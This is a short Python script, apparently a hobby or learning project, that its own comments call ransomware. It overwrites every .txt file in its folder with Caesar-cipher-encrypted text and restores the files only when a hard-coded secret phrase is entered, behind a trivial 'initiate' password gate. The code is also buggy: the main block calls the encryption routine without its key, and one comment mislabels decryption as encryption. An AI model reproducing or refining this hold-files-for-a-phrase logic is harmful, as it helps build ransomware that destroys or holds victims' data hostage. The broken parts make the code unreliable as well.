import os
import sys
import logging
from encrypt import encrypt
from decrypt import decrypt



# Encrypt files
def encrypt_file(key, filename):

    # Load the content of file
    with open(filename, 'r') as file:
        content = file.read()

    # Encrypt data
    encrypted_data = encrypt(content, key)

    # Rewrite the encrypted data in file
    with open(filename, 'w') as file:
        file.write(encrypted_data)


# Encrypt files
def decrypt_file(key, filename):

    # Load the content of file
    with open(filename, 'r') as file:
        content = file.read()

    # Decrypt data
    decrypted_data = decrypt(content, key)

    # Rewrite the decrypted data in file
    with open(filename, 'w') as file:
        content = file.write(decrypted_data)


# List of file paths in path
def file_paths(path):

    files = []
    code_files = ["maze.py", "decrypt.py", "encrypt.py", "README.md", ".gitignore"]
    for file in os.listdir(path):

        # Ignore code files
        if file in code_files or file == sys.argv[0]:  #sys.argv[0] == 'script.py'
            continue

        file_path = os.path.join(path, file)

        # Only considering text files
        if os.path.isfile(file_path) and file.endswith(".txt"):
            files.append(file_path)

    return files


# Encrypt files
def encrypt_all_files(key, path):
    
    encrypted_files = 0
    files = file_paths(path)

    # Encrypt each file in path
    for file in files:
        encrypt_file(key, file)
        encrypted_files += 1

    return encrypted_files


# Decrypt files
def decrypt_all_files(key, path):
    
    decrypted_files = 0
    files = file_paths(path)

    # Decrypt each file in path
    for file in files:
        decrypt_file(key, file)
        decrypted_files += 1

    return decrypted_files


# MAIN FUNCTION 
if __name__ == '__main__':


    # Safeguard against running into your own computer
    safeguard = input('Enter the password to run')
    if(safeguard != 'initiate'):
        quit()


    # Key (using caesar cipher for now!)
    key = 2

    # Encrypt files of same folder (which has maze)
    path = os.path.dirname(os.path.abspath(__file__))
    no_encrypted_files = encrypt_all_files(path)
    print('Number of encrypted files: {}'.format(no_encrypted_files))


    # Ransomware real work
    secret_phrase = "Don't let the muggles get you down"
    user_phrase = input('Enter the secret phrase: ')    

    if(user_phrase == secret_phrase):
        decrypt_all_files(key, path)
    else:    
        print("Sorry, rong phrase!")    